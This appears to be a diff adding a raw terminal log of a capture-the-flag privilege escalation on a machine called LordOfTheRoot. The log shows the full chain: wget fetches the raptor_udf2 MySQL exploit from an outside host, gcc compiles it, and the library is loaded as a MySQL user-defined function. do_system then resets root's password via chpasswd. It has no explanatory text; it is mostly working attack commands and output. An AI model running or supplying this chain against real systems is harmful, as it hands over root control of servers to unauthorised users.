@@ -1,0 +1,76 @@
+smeagol@LordOfTheRoot:~$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
+--2015-11-24 00:55:17--  http://0xdeadbeef.info/exploits/raptor_udf2.c
+Resolving 0xdeadbeef.info (0xdeadbeef.info)... 213.254.16.4
+Connecting to 0xdeadbeef.info (0xdeadbeef.info)|213.254.16.4|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3178 (3.1K) [text/x-csrc]
+Saving to: ‘raptor_udf2.c’
+
+100%[================================================================================================================================>]
+3,178       --.-K/s   in 0.02s   
+
+2015-11-24 00:55:18 (203 KB/s) - ‘raptor_udf2.c’ saved [3178/3178]
+
+smeagol@LordOfTheRoot:~$ gcc -g -c raptor_udf2.c
+smeagol@LordOfTheRoot:~$ gcc -g -shared -W1,-soname,raptor_udf2.so -o
+raptor_udf2.so raptor_udf2.o -lc
+gcc: error: unrecognized command line option ‘-W1,-soname,raptor_udf2.so’
+smeagol@LordOfTheRoot:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o
+raptor_udf2.so raptor_udf2.o -lc
+smeagol@LordOfTheRoot:~$ mysql -u root
+ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password:
+NO)
+smeagol@LordOfTheRoot:~$ mysql -u root -p
+Enter password: 
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 2193
+Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> use mysql;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> create table foo(line blob);
+ERROR 1050 (42S01): Table 'foo' already exists
+mysql> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));
+Query OK, 1 row affected (0.01 sec)
+
+mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
+ERROR 1086 (HY000): File '/usr/lib/mysql/plugin/raptor_udf2.so' already exists
+mysql> create function do_system returns integer soname 'raptor_udf2.so';
+Query OK, 0 rows affected (0.00 sec)
+
+mysql> select * from mysql.func;
++-----------+-----+----------------+----------+
+| name      | ret | dl             | type     |
++-----------+-----+----------------+----------+
+| do_system |   2 | raptor_udf2.so | function |
++-----------+-----+----------------+----------+
+1 row in set (0.00 sec)
+
+mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown
+smeagol.smeagol /tmp/out');
++---------------------------------------------------------------------------------------+
+| do_system('echo "root:passwd" | chpasswd > /tmp/out; chown smeagol.smeagol
+/tmp/out') |
++---------------------------------------------------------------------------------------+
+|
+0 |
++---------------------------------------------------------------------------------------+
+1 row in set (0.02 sec)
+
+mysql> exit
+Bye
+
+-> root has now the password 'passwd'
+
+
